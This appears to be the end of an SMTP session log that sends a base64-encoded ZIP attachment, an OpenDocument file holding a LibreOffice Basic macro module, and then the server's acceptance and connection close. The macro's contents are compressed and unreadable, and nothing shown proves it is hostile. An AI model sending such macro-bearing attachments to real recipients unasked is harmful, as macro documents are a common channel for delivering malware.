 -> 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
 -> AAAcAAAAQ29uZmlndXJhdGlvbnMyL2FjY2VsZXJhdG9yL1BLAwQUAAAAAAAtX2pbAAAAAAAAAAAA
 -> AAAAGAAAAENvbmZpZ3VyYXRpb25zMi9mbG9hdGVyL1BLAwQUAAAAAAAtX2pbAAAAAAAAAAAAAAAA
 -> FwAAAENvbmZpZ3VyYXRpb25zMi9pbWFnZXMvUEsDBBQAAAAAAC1falsAAAAAAAAAAAAAAAAYAAAA
 -> Q29uZmlndXJhdGlvbnMyL21lbnViYXIvUEsDBBQAAAAAAC1falsAAAAAAAAAAAAAAAAaAAAAQ29u
 -> ZmlndXJhdGlvbnMyL3BvcHVwbWVudS9QSwMEFAAAAAAALV9qWwAAAAAAAAAAAAAAABwAAABDb25m
 -> aWd1cmF0aW9uczIvcHJvZ3Jlc3NiYXIvUEsDBBQAAAAAAC1falsAAAAAAAAAAAAAAAAaAAAAQ29u
 -> ZmlndXJhdGlvbnMyL3N0YXR1c2Jhci9QSwMEFAAAAAAALV9qWwAAAAAAAAAAAAAAABgAAABDb25m
 -> aWd1cmF0aW9uczIvdG9vbGJhci9QSwMEFAAAAAAALV9qWwAAAAAAAAAAAAAAABoAAABDb25maWd1
 -> cmF0aW9uczIvdG9vbHBhbmVsL1BLAwQUAAAAAAAtX2pbAAAAAAAAAAAAAAAAHwAAAENvbmZpZ3Vy
 -> YXRpb25zMi9pbWFnZXMvQml0bWFwcy9QSwECFAMUAAAAAAAtX2pbAAAAAAAAAAAAAAAABgAAAAAA
 -> AAAAABAA/UEAAAAAQmFzaWMvUEsBAhQDFAAAAAAALV9qWwAAAAAAAAAAAAAAABAAAAAAAAAAAAAQ
 -> AP1BJAAAAENvbmZpZ3VyYXRpb25zMi9QSwECFAMUAAAAAAAtX2pbAAAAAAAAAAAAAAAACQAAAAAA
 -> AAAAABAA/UFSAAAATUVUQS1JTkYvUEsBAhQDFAAAAAAALV9qWwAAAAAAAAAAAAAAAAsAAAAAAAAA
 -> AAAQAP1BeQAAAFRodW1ibmFpbHMvUEsBAhQDFAAAAAgALV9qW8Qp0KCnAQAAaAMAAAgAAAAAAAAA
 -> AAAAALSBogAAAG1ldGEueG1sUEsBAhQDFAAAAAgALV9qWx+YVXZeBAAAaA8AAAsAAAAAAAAAAAAA
 -> ALSBbwIAAGNvbnRlbnQueG1sUEsBAhQDFAAAAAgALV9qW9X4snEGAQAAkwMAAAwAAAAAAAAAAAAA
 -> ALSB9gYAAG1hbmlmZXN0LnJkZlBLAQIUAxQAAAAIAC1faluT16DaOwcAAMgzAAAKAAAAAAAAAAAA
 -> AAC0gSYIAABzdHlsZXMueG1sUEsBAhQDFAAAAAgALV9qW4VsOYosAAAALgAAAAgAAAAAAAAAAAAA
 -> ALSBiQ8AAG1pbWV0eXBlUEsBAhQDFAAAAAgALV9qW7Sg2I7YBgAAWz8AAAwAAAAAAAAAAAAAALSB
 -> 2w8AAHNldHRpbmdzLnhtbFBLAQIUAxQAAAAIAC1falu92ppsVQEAAGkFAAAVAAAAAAAAAAAAAAC0
 -> gd0WAABNRVRBLUlORi9tYW5pZmVzdC54bWxQSwECFAMUAAAAAAAtX2pbAAAAAAAAAAAAAAAADwAA
 -> AAAAAAAAABAA/UFlGAAAQmFzaWMvU3RhbmRhcmQvUEsBAhQDFAAAAAgALV9qW05lg3HUAAAAVgEA
 -> ABMAAAAAAAAAAAAAALSBkhgAAEJhc2ljL3NjcmlwdC1sYy54bWxQSwECFAMUAAAACAAtX2pbuk6f
 -> MNkAAABgAQAAHAAAAAAAAAAAAAAAtIGXGQAAQmFzaWMvU3RhbmRhcmQvc2NyaXB0LWxiLnhtbFBL
 -> AQIUAxQAAAAIAC1fals7KjgdnAMAACIHAAAaAAAAAAAAAAAAAAC0gaoaAABCYXNpYy9TdGFuZGFy
 -> ZC9Nb2R1bGUxLnhtbFBLAQIUAxQAAAAIAC1falumhDBVYAAAAJMAAAAYAAAAAAAAAAAAAAC0gX4e
 -> AABUaHVtYm5haWxzL3RodW1ibmFpbC5wbmdQSwECFAMUAAAAAAAtX2pbAAAAAAAAAAAAAAAAHAAA
 -> AAAAAAAAABAA/UEUHwAAQ29uZmlndXJhdGlvbnMyL2FjY2VsZXJhdG9yL1BLAQIUAxQAAAAAAC1f
 -> alsAAAAAAAAAAAAAAAAYAAAAAAAAAAAAEAD9QU4fAABDb25maWd1cmF0aW9uczIvZmxvYXRlci9Q
 -> SwECFAMUAAAAAAAtX2pbAAAAAAAAAAAAAAAAFwAAAAAAAAAAABAA/UGEHwAAQ29uZmlndXJhdGlv
 -> bnMyL2ltYWdlcy9QSwECFAMUAAAAAAAtX2pbAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UG5HwAA
 -> Q29uZmlndXJhdGlvbnMyL21lbnViYXIvUEsBAhQDFAAAAAAALV9qWwAAAAAAAAAAAAAAABoAAAAA
 -> AAAAAAAQAP1B7x8AAENvbmZpZ3VyYXRpb25zMi9wb3B1cG1lbnUvUEsBAhQDFAAAAAAALV9qWwAA
 -> AAAAAAAAAAAAABwAAAAAAAAAAAAQAP1BJyAAAENvbmZpZ3VyYXRpb25zMi9wcm9ncmVzc2Jhci9Q
 -> SwECFAMUAAAAAAAtX2pbAAAAAAAAAAAAAAAAGgAAAAAAAAAAABAA/UFhIAAAQ29uZmlndXJhdGlv
 -> bnMyL3N0YXR1c2Jhci9QSwECFAMUAAAAAAAtX2pbAAAAAAAAAAAAAAAAGAAAAAAAAAAAABAA/UGZ
 -> IAAAQ29uZmlndXJhdGlvbnMyL3Rvb2xiYXIvUEsBAhQDFAAAAAAALV9qWwAAAAAAAAAAAAAAABoA
 -> AAAAAAAAAAAQAP1BzyAAAENvbmZpZ3VyYXRpb25zMi90b29scGFuZWwvUEsBAhQDFAAAAAAALV9q
 -> WwAAAAAAAAAAAAAAAB8AAAAAAAAAAAAQAP1BByEAAENvbmZpZ3VyYXRpb25zMi9pbWFnZXMvQml0
 -> bWFwcy9QSwUGAAAAABoAGgCcBgAARCEAAAAA
 -> 
 -> ------=_MIME_BOUNDARY_000_9845--
 -> 
 -> 
 -> .
<-  250 Data received OK.
 -> QUIT
<-  221 localhost Service closing channel.
=== Connection closed with remote host.
```
